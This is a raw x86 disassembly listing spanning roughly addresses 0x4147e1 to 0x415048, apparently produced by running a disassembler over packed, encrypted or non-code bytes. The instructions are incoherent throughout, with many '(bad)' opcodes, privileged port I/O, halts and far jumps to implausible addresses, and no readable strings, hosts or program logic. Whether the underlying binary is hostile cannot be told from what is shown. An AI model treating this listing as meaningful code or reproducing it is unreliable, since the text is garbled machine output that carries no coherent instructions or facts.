  4147e1:	adc    BYTE PTR [edi+0x36],0xba
  4147e5:	out    0xa1,al
  4147e7:	js     0x41484b
  4147e9:	lods   eax,DWORD PTR ds:[esi]
  4147ea:	imul   ebx,DWORD PTR ds:0x3587ed9c,0xa955d7c0
  4147f4:	xor    edi,DWORD PTR [ecx+eax*1-0x9be41b]
  4147fb:	or     BYTE PTR [edi],dl
  4147fd:	lods   eax,DWORD PTR ds:[esi]
  4147fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ff:	cmp    eax,0xe271102f
  414804:	jge    0x4147a1
  414806:	(bad)  
  414807:	xchg   edi,eax
  414808:	fiadd  DWORD PTR [ebx+0xd]
  41480b:	mov    al,0x2
  41480d:	and    BYTE PTR [ebx-0x31d23ea3],bh
  414813:	ja     0x414796
  414815:	adc    eax,0xacf8089e
  41481a:	jne    0x4147ea
  41481c:	stos   DWORD PTR es:[edi],eax
  41481d:	push   eax
  41481e:	fdivr  DWORD PTR [eax-0x78]
  414821:	cdq    
  414822:	push   ss
  414823:	sbb    ebp,esp
  414825:	mov    ds:0x913bd9d8,al
  41482a:	mov    eax,0xb26f61b6
  41482f:	push   edi
  414830:	sub    edx,DWORD PTR [ebx-0x75]
  414833:	(bad)  
  414834:	pop    edx
  414835:	sbb    edx,DWORD PTR gs:[edi-0x1b]
  414839:	jmp    0x15b79f29
  41483e:	popf   
  41483f:	or     al,0xcd
  414841:	aaa    
  414842:	lock outs dx,BYTE PTR ds:[si]
  414845:	scas   eax,DWORD PTR es:[edi]
  414846:	test   eax,0x667d153
  41484b:	repnz lock pusha 
  41484e:	dec    edx
  41484f:	mov    dl,0xb0
  414851:	jp     0x41483d
  414853:	fstp   QWORD PTR [ecx+edx*4+0x6c82ad27]
  41485a:	xlat   BYTE PTR ds:[ebx]
  41485b:	adc    DWORD PTR [ebp-0x7b],ebx
  41485e:	push   ebp
  41485f:	dec    edx
  414860:	jo     0x414873
  414862:	fisubr WORD PTR [ebp-0x38a5301]
  414868:	pop    ds
  414869:	icebp  
  41486a:	cmp    BYTE PTR [eax],al
  41486c:	addr16 sub eax,0xaf11cd55
  414872:	mov    al,0xf9
  414874:	lahf   
  414875:	outs   dx,BYTE PTR ds:[esi]
  414876:	pop    ds
  414877:	jmp    0x4148d0
  414879:	cli    
  41487a:	aad    0x4e
  41487c:	xor    cl,0x26
  41487f:	push   0x43
  414881:	call   0xec7ed410
  414886:	mov    edx,0x35dc97b9
  41488b:	cmp    esi,DWORD PTR [edx]
  41488d:	rcl    BYTE PTR [ebx+0x1fa0aa39],cl
  414893:	or     DWORD PTR es:[ebp-0x7b9cf27e],esp
  41489a:	test   DWORD PTR [eax-0x678945fb],ebx
  4148a0:	mov    dh,0xb1
  4148a2:	push   ds
  4148a3:	leave  
  4148a4:	jmp    0x8481:0x9ea79481
  4148ab:	(bad)  
  4148ac:	and    dl,BYTE PTR [eax-0x63]
  4148af:	jmp    FWORD PTR [edi]
  4148b1:	dec    ebx
  4148b2:	fsub   DWORD PTR [edx+0x328985e]
  4148b8:	mov    esi,0x4f78d0e9
  4148bd:	loope  0x414905
  4148bf:	sbb    eax,0x3553491
  4148c4:	xor    bh,BYTE PTR [ebx+ecx*2-0x17]
  4148c8:	mov    BYTE PTR [ebp-0x4ec1e4af],cl
  4148ce:	(bad)  
  4148cf:	mov    ebx,0x65d324f9
  4148d4:	jmp    0xcba14879
  4148d9:	arpl   bx,bp
  4148db:	mov    ah,0xf3
  4148dd:	or     eax,0x438973a3
  4148e2:	push   esp
  4148e3:	sbb    al,0x49
  4148e5:	enter  0xea50,0x5a
  4148e9:	jmp    0x48512228
  4148ee:	aam    0xb9
  4148f0:	push   0x64
  4148f2:	std    
  4148f3:	ds nop
  4148f5:	sub    edi,edi
  4148f7:	lock xchg BYTE PTR [esi-0x4],dh
  4148fb:	and    edi,esp
  4148fd:	in     al,0xbc
  4148ff:	retf   
  414900:	mov    eax,ds:0x786b2254
  414905:	pop    ss
  414906:	add    eax,0x9b61d6e8
  41490b:	aaa    
  41490c:	mov    edi,0x926859c7
  414911:	xchg   ecx,eax
  414912:	cmp    DWORD PTR [ecx-0x1d],ecx
  414915:	(bad)  
  414917:	mov    al,ds:0x6005b136
  41491c:	stos   BYTE PTR es:[edi],al
  41491d:	push   esi
  41491e:	repz ds inc esp
  414921:	inc    eax
  414922:	fmul   QWORD PTR [edi-0x1a]
  414925:	stc    
  414926:	int3   
  414927:	add    eax,0xc2d94d84
  41492c:	(bad)  
  41492d:	cmp    cl,cl
  41492f:	sub    DWORD PTR [ebx+0x1b5cce5c],eax
  414935:	loop   0x41497c
  414937:	(bad)  [edx]
  414939:	das    
  41493a:	jl     0x414940
  41493c:	sbb    ch,al
  41493e:	jmp    0xfe8d3ca4
  414943:	sti    
  414944:	call   0x4b6223bc
  414949:	je     0x414979
  41494b:	pop    ecx
  41494c:	inc    edx
  41494d:	jae    0x414960
  41494f:	daa    
  414950:	xchg   DWORD PTR [eax+0x46],edx
  414953:	dec    ecx
  414954:	gs out 0xbd,al
  414957:	aas    
  414958:	imul   esi,DWORD PTR [esi+eiz*1],0x6b
  41495c:	clc    
  41495d:	das    
  41495e:	cmp    al,BYTE PTR [edx]
  414960:	pop    ss
  414961:	call   0x40bf44e9
  414966:	fisubr WORD PTR [esi]
  414968:	sbb    esi,edx
  41496a:	mov    dh,0x4e
  41496c:	dec    ecx
  41496d:	add    eax,0xe7dfb6c7
  414972:	push   ebx
  414973:	push   cs
  414974:	gs popa 
  414976:	inc    ebx
  414977:	xchg   esp,eax
  414978:	rcr    esp,cl
  41497a:	int3   
  41497b:	call   0x5847025c
  414980:	xor    ecx,DWORD PTR [edi+ebx*8-0x31aed802]
  414987:	outs   dx,BYTE PTR ds:[esi]
  414988:	push   0x85c6e842
  41498d:	fldcw  WORD PTR [eax-0x7d22d4ad]
  414993:	inc    esi
  414994:	xor    eax,0xffcfcf6b
  414999:	hlt    
  41499a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41499b:	mov    ecx,0xc9ed78b7
  4149a0:	jl     0x414a12
  4149a2:	popf   
  4149a3:	mov    al,ds:0xe7498b80
  4149a8:	ss sbb eax,0x4b42bb06
  4149ae:	mov    al,0xca
  4149b0:	sti    
  4149b1:	inc    eax
  4149b2:	cmc    
  4149b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149b4:	inc    esp
  4149b5:	mov    ds:0xd327d55f,eax
  4149ba:	adc    eax,0x5caab086
  4149bf:	les    esi,FWORD PTR [eax+0x62]
  4149c2:	or     al,BYTE PTR [edx-0x37b53b77]
  4149c8:	push   ds
  4149c9:	scas   eax,DWORD PTR es:[edi]
  4149ca:	cwde   
  4149cb:	mov    gs,ebx
  4149cd:	push   esp
  4149ce:	sbb    eax,0x617cee7
  4149d3:	xchg   ebx,eax
  4149d4:	js     0x4149a8
  4149d6:	das    
  4149d7:	pop    ss
  4149d8:	inc    esi
  4149d9:	and    ebx,DWORD PTR [ebx+ebp*2]
  4149dc:	or     BYTE PTR [ecx-0x6916be3d],al
  4149e2:	jge    0x414978
  4149e4:	jle    0x414a42
  4149e6:	into   
  4149e7:	sub    eax,0x4c4aa157
  4149ec:	xlat   BYTE PTR ds:[ebx]
  4149ed:	dec    eax
  4149ee:	pop    es
  4149ef:	pop    ecx
  4149f0:	pop    ds
  4149f1:	adc    edi,DWORD PTR [ebx]
  4149f3:	std    
  4149f4:	push   esp
  4149f5:	adc    eax,0xd482c0c6
  4149fa:	fstp   QWORD PTR [ebp-0x1d]
  4149fd:	xchg   esi,eax
  4149fe:	mov    DWORD PTR [esi],eax
  414a00:	mov    eax,ds:0x43ae94e0
  414a05:	ret    0x26be
  414a08:	xchg   ecx,eax
  414a09:	pushf  
  414a0a:	fild   QWORD PTR [ecx+esi*4+0x5e]
  414a0e:	cs and al,0x1b
  414a11:	mov    ds:0xae57f0a8,eax
  414a16:	mov    esp,0xc5b4387b
  414a1b:	adc    edi,DWORD PTR [eax+0x6]
  414a1e:	ficom  WORD PTR [ebx+0x5]
  414a21:	xchg   DWORD PTR [edx],edi
  414a23:	inc    ebp
  414a24:	arpl   WORD PTR [ecx+0x2498b8ee],bx
  414a2a:	test   BYTE PTR [edx-0x6f41aaee],dl
  414a30:	repnz arpl sp,cx
  414a33:	xchg   esi,eax
  414a34:	xor    ch,BYTE PTR [esi+ecx*8+0x56f59872]
  414a3b:	xor    DWORD PTR [ecx+0x4f7e657d],0x58
  414a42:	jecxz  0x414a0a
  414a44:	xchg   ebp,eax
  414a45:	and    BYTE PTR [edi+0x1fff6e0d],ch
  414a4b:	and    eax,0x8551fee3
  414a50:	int    0x2
  414a52:	ret    0x90a8
  414a55:	or     DWORD PTR [ebp-0x4b],eax
  414a58:	mov    edx,0x454740ea
  414a5d:	adc    eax,0xf50a568a
  414a62:	sbb    dh,BYTE PTR [edi-0x77214d07]
  414a68:	sbb    dh,dl
  414a6a:	mov    cl,0x28
  414a6c:	pop    ebp
  414a6d:	icebp  
  414a6e:	cmp    al,0x84
  414a70:	mov    esp,0x5ffd8c8e
  414a75:	jno    0x414a07
  414a77:	std    
  414a78:	out    0xc7,al
  414a7a:	neg    edi
  414a7c:	and    eax,0xd0c50db1
  414a81:	sbb    bh,BYTE PTR [edx-0x7e]
  414a84:	cmp    BYTE PTR [edx],dl
  414a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a87:	jp     0x414add
  414a89:	adc    eax,ebp
  414a8b:	fadd   st(5),st
  414a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a8e:	stc    
  414a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a90:	push   es
  414a91:	sub    eax,0x10339f96
  414a96:	and    al,0x0
  414a98:	xchg   ebx,eax
  414a99:	add    eax,DWORD PTR ds:0x87ab87b6
  414a9f:	or     al,0xbe
  414aa1:	adc    edx,edx
  414aa3:	test   al,0x97
  414aa5:	fild   QWORD PTR [eax]
  414aa7:	adc    BYTE PTR [eax+0x58ef2526],0xef
  414aae:	iret   
  414aaf:	loop   0x414a45
  414ab1:	(bad)  
  414ab2:	(bad)  
  414ab3:	and    BYTE PTR [edx],dh
  414ab5:	jno    0x414ac2
  414ab7:	outs   dx,BYTE PTR ds:[esi]
  414ab8:	hlt    
  414ab9:	add    dh,bh
  414abb:	ror    BYTE PTR [esi+eiz*1-0x225b4351],cl
  414ac2:	cmc    
  414ac3:	clc    
  414ac4:	or     esp,DWORD PTR [esi]
  414ac6:	xor    ebp,esi
  414ac8:	pushf  
  414ac9:	push   esp
  414aca:	int3   
  414acb:	shl    DWORD PTR [edi+0x7],1
  414ace:	lea    ebp,[ebp+ebx*2-0x42]
  414ad2:	add    edx,DWORD PTR [eax]
  414ad4:	or     ebp,DWORD PTR [esi]
  414ad6:	mov    al,0xd4
  414ad8:	je     0x414b55
  414ada:	xlat   BYTE PTR ds:[ebx]
  414adb:	jp     0x414af1
  414add:	xchg   ebx,eax
  414ade:	into   
  414adf:	jle    0x414b37
  414ae1:	xor    bh,dl
  414ae3:	daa    
  414ae4:	mov    edi,0xc0161bbe
  414ae9:	fist   DWORD PTR [edx+0x1d]
  414aec:	push   ebp
  414aed:	aad    0x29
  414aef:	pop    ebx
  414af0:	lods   eax,DWORD PTR ds:[esi]
  414af1:	and    edi,esp
  414af3:	rcr    DWORD PTR [edi-0x6b8d1a6e],cl
  414af9:	jp     0x414b75
  414afb:	jns    0x414a8e
  414afd:	jp     0x414b21
  414aff:	cwde   
  414b00:	rol    DWORD PTR [esi+0x3df6a23e],cl
  414b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b07:	mov    eax,ds:0xefe51ea6
  414b0c:	cmc    
  414b0d:	push   0xffffffc3
  414b0f:	push   es
  414b10:	in     al,0xf0
  414b12:	pop    es
  414b13:	cli    
  414b14:	ins    BYTE PTR es:[edi],dx
  414b15:	cmp    esi,DWORD PTR [ebx-0x355305a6]
  414b1b:	and    DWORD PTR [edi+0x1096f986],edi
  414b21:	mov    ax,0x159
  414b25:	mov    cl,0xa
  414b27:	jmp    0xc24:0x8d57b8bd
  414b2e:	push   ebp
  414b2f:	jo     0x414ac7
  414b31:	jge    0x414b83
  414b33:	and    eax,0x44dfdbec
  414b38:	lock (bad) 
  414b3a:	mov    gs,WORD PTR [edi]
  414b3c:	pop    ds
  414b3d:	or     al,0x41
  414b3f:	jns    0x414b98
  414b41:	fldl2e 
  414b43:	imul   BYTE PTR [ebp+0x18]
  414b46:	add    DWORD PTR [ebx+0x367d70f6],0x5b47cef2
  414b50:	or     al,BYTE PTR [ebp+0x7d0fae2a]
  414b56:	std    
  414b57:	mov    cl,0x7f
  414b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b5a:	pop    ecx
  414b5b:	ror    DWORD PTR [eax],cl
  414b5d:	jecxz  0x414ba9
  414b5f:	cwde   
  414b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b61:	mov    ch,0x39
  414b63:	(bad)  
  414b64:	or     DWORD PTR [edx+0x726b5ec],esi
  414b6a:	(bad)  
  414b6b:	inc    DWORD PTR [edx+esi*4]
  414b6e:	pusha  
  414b6f:	mov    ds:0x6309e4d7,al
  414b74:	gs in  al,dx
  414b76:	outs   dx,BYTE PTR ds:[esi]
  414b77:	inc    edi
  414b78:	dec    edx
  414b79:	xor    BYTE PTR [edx-0x51],dl
  414b7c:	jno    0x414bb6
  414b7e:	rol    dh,cl
  414b80:	loop   0x414b79
  414b82:	in     al,0x23
  414b84:	inc    edi
  414b85:	pop    esp
  414b86:	xchg   ebp,eax
  414b87:	mov    al,ds:0x4fc19b12
  414b8c:	sbb    eax,0xae4dc19d
  414b91:	ss popa 
  414b93:	mov    ebp,0x7db6f099
  414b98:	sbb    edi,DWORD PTR [esi-0x48e576c6]
  414b9e:	stos   DWORD PTR es:[edi],eax
  414b9f:	daa    
  414ba0:	mov    fs,WORD PTR [edx-0x6]
  414ba3:	sub    DWORD PTR ds:0x6dc45686,edx
  414ba9:	add    BYTE PTR [ecx-0xb],cl
  414bac:	aad    0x21
  414bae:	(bad)  
  414bb0:	dec    eax
  414bb1:	addr16 or bh,ch
  414bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb6:	loope  0x414b3b
  414bb8:	pop    ss
  414bb9:	pushf  
  414bba:	add    eax,0x1fc85bdc
  414bbf:	fcom   QWORD PTR [edi-0xb]
  414bc2:	cld    
  414bc3:	adc    ch,BYTE PTR [ebx+esi*4+0x18]
  414bc7:	push   eax
  414bc8:	(bad)
  414bcc:	and    eax,DWORD PTR [ecx+0x424a4954]
  414bd2:	sub    edx,ecx
  414bd4:	out    0x62,eax
  414bd6:	jne    0x414c3c
  414bd8:	inc    ecx
  414bd9:	adc    esi,DWORD PTR [eax]
  414bdb:	jmp    0x414b98
  414bdd:	mov    esp,0x68cbadfa
  414be2:	mov    dh,0xba
  414be4:	pop    ds
  414be5:	xchg   BYTE PTR [ecx+0x5d27110e],ch
  414beb:	and    BYTE PTR [ecx],0x83
  414bee:	inc    eax
  414bef:	div    BYTE PTR [ecx]
  414bf1:	dec    edi
  414bf2:	idiv   bl
  414bf4:	sbb    bl,BYTE PTR [esi-0xa99f5e4]
  414bfa:	or     al,0x2
  414bfc:	pop    ecx
  414bfd:	cmp    BYTE PTR [ecx-0x53db9da],dl
  414c03:	mov    al,ds:0x977b2c5b
  414c08:	mov    eax,0x6394aefe
  414c0d:	lea    edi,[esi-0x6d79b89d]
  414c13:	cmp    DWORD PTR [ecx+0x44],esi
  414c16:	xor    cl,BYTE PTR [eax-0x1f]
  414c19:	mov    ah,0x2f
  414c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c1c:	and    esp,DWORD PTR [edi-0x71554929]
  414c22:	popf   
  414c23:	push   ecx
  414c24:	in     al,0x41
  414c26:	xchg   esi,eax
  414c27:	arpl   WORD PTR [ecx+0x698d54bd],dx
  414c2d:	out    dx,al
  414c2e:	stos   DWORD PTR es:[edi],eax
  414c2f:	push   cs
  414c30:	cmp    eax,0x5dfa7562
  414c35:	in     eax,0x8b
  414c37:	xor    dl,cl
  414c39:	xor    eax,0x87c45ee2
  414c3e:	cli    
  414c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c40:	test   eax,0xe02b3900
  414c45:	(bad)  
  414c46:	(bad)  
  414c47:	(bad)  
  414c48:	push   es
  414c49:	xchg   ebx,eax
  414c4a:	mov    DWORD PTR [eiz*4+0x1a3f9acc],eax
  414c51:	and    DWORD PTR [ebx+0xb02b86c],0x68787662
  414c5b:	push   ebp
  414c5c:	dec    esi
  414c5d:	(bad)  
  414c5e:	call   0x8040dd8
  414c63:	and    BYTE PTR [ebp-0x371451ce],0x5b
  414c6a:	enter  0x725e,0x94
  414c6e:	loopne 0x414c59
  414c70:	(bad)  
  414c71:	jmp    0x6cc45b54
  414c76:	cdq    
  414c77:	leave  
  414c78:	and    ebx,DWORD PTR [esi]
  414c7a:	mov    eax,0x1cd6b170
  414c7f:	test   DWORD PTR [edx],edx
  414c81:	ror    BYTE PTR [ecx],1
  414c83:	add    al,0xd8
  414c85:	xchg   ebp,eax
  414c86:	mov    cl,0xe1
  414c88:	not    BYTE PTR [eax+0x17]
  414c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c8c:	int    0xb5
  414c8e:	mov    ds:0xcaf30ede,eax
  414c93:	addr16 in al,0x0
	...
  414d12:	add    BYTE PTR [eax],al
  414d14:	adc    DWORD PTR [ebp-0x1caa2],esp
  414d1a:	jnp    0x414cc1
  414d1c:	int    0xa1
  414d1e:	ficom  WORD PTR [esp+edx*8-0x2a]
  414d22:	pop    ds
  414d23:	dec    eax
  414d24:	in     al,dx
  414d25:	repnz add BYTE PTR [eax],al
  414d28:	imul   eax,DWORD PTR [edi],0x9fc70000
  414d2e:	or     ecx,DWORD PTR [edi+0x39f3cac4]
  414d34:	out    dx,al
  414d35:	hlt    
  414d36:	mov    edi,0x916a552f
  414d3b:	fwait
  414d3c:	std    
  414d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d3e:	sbb    DWORD PTR [eax-0x646cbfcc],edi
  414d44:	pusha  
  414d45:	push   cs
  414d46:	das    
  414d47:	and    ebx,DWORD PTR ds:0xd1905eac
  414d4d:	mov    ecx,0xf63cdb95
  414d52:	imul   edx,esp,0x61
  414d55:	dec    ecx
  414d56:	xor    edx,esp
  414d58:	push   esi
  414d59:	dec    edx
  414d5a:	retf   
  414d5b:	jp     0x414d57
  414d5d:	cld    
  414d5e:	add    dl,ah
  414d60:	int3   
  414d61:	ins    BYTE PTR es:[edi],dx
  414d62:	fadd   st,st(1)
  414d64:	adc    ah,ch
  414d66:	inc    edi
  414d67:	xor    eax,0x3db56e65
  414d6c:	push   ebx
  414d6d:	pop    ecx
  414d6e:	ss pusha 
  414d70:	arpl   WORD PTR [edi+0xce02768],ax
  414d76:	mov    dh,0x5f
  414d78:	sahf   
  414d79:	jns    0x414d1f
  414d7b:	test   eax,0x94dc7458
  414d80:	enter  0xb1e9,0xd
  414d84:	mov    eax,0x874b573a
  414d89:	mov    dh,0xef
  414d8b:	ror    DWORD PTR [ebx-0x6c],cl
  414d8e:	stos   DWORD PTR es:[edi],eax
  414d8f:	idiv   DWORD PTR [ebx-0x10ff15e1]
  414d95:	push   edx
  414d96:	(bad)  
  414d97:	std    
  414d98:	nop
  414d99:	add    eax,0x9aa0c6ee
  414d9e:	ja     0x414da0
  414da0:	mov    cl,0x76
  414da2:	mov    dh,0xe7
  414da4:	mov    DWORD PTR [eax],eax
  414da6:	xchg   DWORD PTR [esp+edi*4-0x7b],eax
  414daa:	test   BYTE PTR [ebx],ah
  414dac:	iret   
  414dad:	loopne 0x414d8e
  414daf:	aas    
  414db0:	push   0xcefb16a
  414db5:	pushf  
  414db6:	or     BYTE PTR [edx+0x44163c99],0x47
  414dbd:	sub    ecx,DWORD PTR [ebx*1+0x22bbc1ec]
  414dc4:	push   esp
  414dc5:	lea    eax,[esi]
  414dc7:	call   0x4868:0x51d89405
  414dce:	mov    dl,0xf2
  414dd0:	pushf  
  414dd1:	inc    ecx
  414dd2:	std    
  414dd3:	hlt    
  414dd4:	sub    BYTE PTR [ebx+0x44],ah
  414dd7:	cwde   
  414dd8:	or     eax,0x5e101c93
  414ddd:	xor    esi,DWORD PTR [edi+0x7c098c32]
  414de3:	jmp    0xbe376aeb
  414de8:	sub    BYTE PTR [esp+edi*8],ch
  414deb:	inc    ebx
  414dec:	dec    esi
  414ded:	dec    ecx
  414dee:	cdq    
  414def:	frstor [ebp-0x34]
  414df2:	jo     0x414e2b
  414df4:	in     al,dx
  414df5:	fimul  WORD PTR [edx+edx*8-0xc4c9c7c]
  414dfc:	jl     0x414e62
  414dfe:	out    dx,al
  414dff:	jmp    0xcfe0:0x96d9e366
  414e06:	add    ah,BYTE PTR [edx-0x585c107c]
  414e0c:	and    DWORD PTR [edi-0x148062e7],eax
  414e12:	inc    edx
  414e13:	cld    
  414e14:	sbb    eax,0xb039b1b8
  414e19:	add    al,0x3e
  414e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1c:	xor    ah,bl
  414e1e:	mov    ecx,ss
  414e20:	in     al,0x43
  414e22:	mov    dl,0xa5
  414e24:	in     al,dx
  414e25:	addr16 inc edi
  414e27:	jne    0x414de5
  414e29:	es dec ebx
  414e2b:	sahf   
  414e2c:	xor    eax,0x5b45a213
  414e31:	add    DWORD PTR [esi-0x22c3688d],ebp
  414e37:	cmp    esp,esp
  414e39:	pop    esi
  414e3a:	callw  0x5811
  414e3e:	icebp  
  414e3f:	(bad)  
  414e40:	clc    
  414e41:	jb     0x414e44
  414e43:	hlt    
  414e44:	mov    ch,0x7d
  414e46:	scas   al,BYTE PTR es:[edi]
  414e47:	mov    edx,0x402109b1
  414e4c:	fwait
  414e4d:	and    al,0xf2
  414e4f:	dec    edx
  414e50:	sbb    cl,BYTE PTR [esi+0x5]
  414e53:	mov    ds:0x4ccdde12,al
  414e58:	aad    0x1
  414e5a:	xchg   edi,eax
  414e5b:	add    ecx,DWORD PTR [ebx]
  414e5d:	jle    0x414eda
  414e5f:	ret    0xcd7d
  414e62:	sub    BYTE PTR [ebp+0x29d73bfc],dh
  414e68:	add    ebx,esi
  414e6a:	xor    DWORD PTR [ebx+esi*1+0x71],esp
  414e6e:	add    esp,ebp
  414e70:	int    0x9d
  414e72:	jno    0x414e1c
  414e74:	xor    bl,BYTE PTR [esi]
  414e76:	inc    esi
  414e77:	fistp  DWORD PTR [esi]
  414e79:	sti    
  414e7a:	push   ss
  414e7b:	push   ds
  414e7c:	out    0x93,eax
  414e7e:	out    0x78,eax
  414e80:	sbb    eax,0xb6a52fae
  414e85:	mul    DWORD PTR [edx-0x31051d44]
  414e8b:	pusha  
  414e8c:	pop    ds
  414e8d:	je     0x414e79
  414e8f:	mov    al,0xa0
  414e91:	adc    BYTE PTR [ebx+0x7b],al
  414e94:	js     0x414e49
  414e96:	lods   eax,DWORD PTR ds:[esi]
  414e97:	mov    edx,0xb9e15fd5
  414e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9d:	fwait
  414e9e:	ds pop ebp
  414ea0:	shl    edx,cl
  414ea2:	shr    BYTE PTR [ebp-0x4c43a41f],1
  414ea8:	mov    ebx,eax
  414eaa:	(bad)  
  414eab:	std    
  414eac:	std    
  414ead:	adc    ebx,edx
  414eaf:	mov    eax,0xd4420384
  414eb4:	enter  0xfe4b,0x3a
  414eb8:	lahf   
  414eb9:	aam    0x8f
  414ebb:	sar    BYTE PTR [ebx-0x29],0x67
  414ebf:	xor    ch,BYTE PTR [esi]
  414ec1:	lods   eax,DWORD PTR ds:[esi]
  414ec2:	jae    0x414e5a
  414ec4:	sbb    BYTE PTR [esi+eax*4+0x6a],0xb8
  414ec9:	loop   0x414f06
  414ecb:	dec    eax
  414ecc:	fwait
  414ecd:	mov    gs,WORD PTR [esp+ebx*4-0x5]
  414ed1:	sbb    cl,ah
  414ed3:	mov    ebp,0x6e678984
  414ed8:	neg    BYTE PTR [edi]
  414eda:	fwait
  414edb:	ss (bad) 
  414edd:	fsub   DWORD PTR [eax]
  414edf:	mov    ecx,0x7183fba
  414ee4:	jmp    0x414e7a
  414ee6:	rcr    DWORD PTR [di+0x7d],1
  414eea:	cmc    
  414eeb:	add    dh,BYTE PTR [edx-0x1dcfd75f]
  414ef1:	mov    ebp,0x5b81c828
  414ef6:	out    0xd0,eax
  414ef8:	xlat   BYTE PTR ds:[ebx]
  414ef9:	sub    eax,0xafaefcaf
  414efe:	mov    ah,0x49
  414f00:	pop    edi
  414f01:	push   ecx
  414f02:	repnz mov dh,0x7a
  414f05:	mov    ds:0x17fd5e7d,al
  414f0a:	popa   
  414f0b:	mov    dh,0x86
  414f0d:	dec    esp
  414f0e:	mov    bh,0xfc
  414f10:	ss stos BYTE PTR es:[edi],al
  414f12:	push   0xffffff88
  414f14:	push   edi
  414f15:	mov    dl,0x66
  414f17:	daa    
  414f18:	sub    eax,0x9e2a9db2
  414f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1e:	mov    ebp,0xae68c3aa
  414f23:	daa    
  414f24:	mov    ebp,0x2511ce49
  414f29:	push   ss
  414f2a:	pop    ds
  414f2b:	jmp    0xb48f:0xa69f12bc
  414f32:	adc    eax,0x65a3821e
  414f37:	mov    ?,esp
  414f39:	pop    edx
  414f3a:	mov    dh,0x52
  414f3c:	dec    ebx
  414f3d:	lds    esi,FWORD PTR [edx-0xa01d52d]
  414f43:	fcmovu st,st(0)
  414f45:	mov    ecx,0xf64789e7
  414f4a:	mov    dh,0xe0
  414f4c:	jp     0x414f35
  414f4e:	xor    BYTE PTR [edi-0x3d],bh
  414f51:	fistp  DWORD PTR [ecx]
  414f53:	add    al,0x11
  414f55:	out    dx,eax
  414f56:	pop    edx
  414f57:	mov    edx,0xf87fb61c
  414f5c:	adc    eax,0xb6c8d083
  414f61:	and    BYTE PTR [eax+esi*4+0x38],bh
  414f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f66:	leave  
  414f67:	dec    edi
  414f68:	or     al,0xb1
  414f6a:	imul   BYTE PTR [ebx]
  414f6c:	stos   DWORD PTR es:[edi],eax
  414f6d:	adc    al,0x56
  414f6f:	adc    edx,DWORD PTR [esi-0x33]
  414f72:	xchg   esi,eax
  414f73:	retf   
  414f74:	jne    0x414f80
  414f76:	cdq    
  414f77:	test   ecx,eax
  414f79:	push   esi
  414f7a:	and    eax,0x213c06f5
  414f7f:	mov    al,ds:0x742ee883
  414f84:	xchg   ebp,eax
  414f85:	xor    eax,0x37890d4c
  414f8a:	sbb    BYTE PTR [esi+edi*1-0x3ec123ae],bl
  414f91:	xor    ecx,edx
  414f93:	dec    esp
  414f94:	loop   0x414fa3
  414f96:	cwde   
  414f97:	mov    esi,0xa1036d1a
  414f9c:	scas   eax,DWORD PTR es:[edi]
  414f9d:	dec    ebx
  414f9e:	lea    ebp,ds:[edx+edx*4-0x2b]
  414fa3:	or     al,0x77
  414fa5:	js     0x414ff0
  414fa7:	push   ebx
  414fa8:	loopne 0x415011
  414faa:	jno    0x414f9a
  414fac:	jns    0x414f30
  414fae:	test   BYTE PTR [esi-0x73],cl
  414fb1:	mov    dh,0xf5
  414fb3:	add    eax,0xd555730c
  414fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb9:	cmp    cl,BYTE PTR [ecx+esi*8+0x56512194]
  414fc0:	jle    0x414f9b
  414fc2:	out    0xcb,al
  414fc4:	jno    0x414f8f
  414fc6:	inc    eax
  414fc7:	fdiv   st,st(5)
  414fc9:	inc    eax
  414fca:	fist   WORD PTR [esi]
  414fcc:	sub    bl,BYTE PTR [eax+eiz*4-0x39]
  414fd0:	popa   
  414fd1:	cli    
  414fd2:	test   DWORD PTR [edx],0x1a5465ca
  414fd8:	push   si
  414fda:	and    al,0x9e
  414fdc:	dec    edi
  414fdd:	sar    eax,1
  414fdf:	cmp    BYTE PTR [eax],0x6f
  414fe2:	mov    edi,0x828ae588
  414fe7:	outs   dx,DWORD PTR ds:[esi]
  414fe8:	retf   0x8807
  414feb:	iret   
  414fec:	mov    eax,ds:0xe145ab1d
  414ff1:	pop    esp
  414ff2:	jmp    0xfddc:0x9c0691b4
  414ff9:	mov    cl,0x1e
  414ffb:	cmp    al,0xab
  414ffd:	or     DWORD PTR [eax],ebx
  414fff:	stc    
  415000:	pop    ss
  415001:	mov    bl,0xc0
  415003:	sbb    dl,BYTE PTR [ecx-0x44d45f2c]
  415009:	out    dx,eax
  41500a:	or     eax,0xd29d353b
  41500f:	jge    0x414fe4
  415011:	sub    al,0x6b
  415013:	int3   
  415014:	cs out 0xa,al
  415017:	icebp  
  415018:	sbb    eax,0xc8add598
  41501d:	mov    ah,BYTE PTR [ebx-0x29]
  415020:	and    BYTE PTR [esi+0xd90a7f5],bh
  415026:	dec    edx
  415027:	adc    BYTE PTR [eax],dh
  415029:	arpl   WORD PTR [edi-0x3593a660],cx
  41502f:	pop    esp
  415030:	leave  
  415031:	mov    esi,DWORD PTR es:[ebx]
  415034:	mov    ch,0xcf
  415036:	add    al,0xbf
  415038:	shl    ecx,1
  41503a:	jbe    0x415028
  41503c:	push   ecx
  41503d:	add    bh,BYTE PTR [eax-0x80]
  415040:	mov    edx,0xcef171b1
  415045:	mov    cl,0xe
  415047:	pushf  
  415048:	adc    eax,0x5909904d
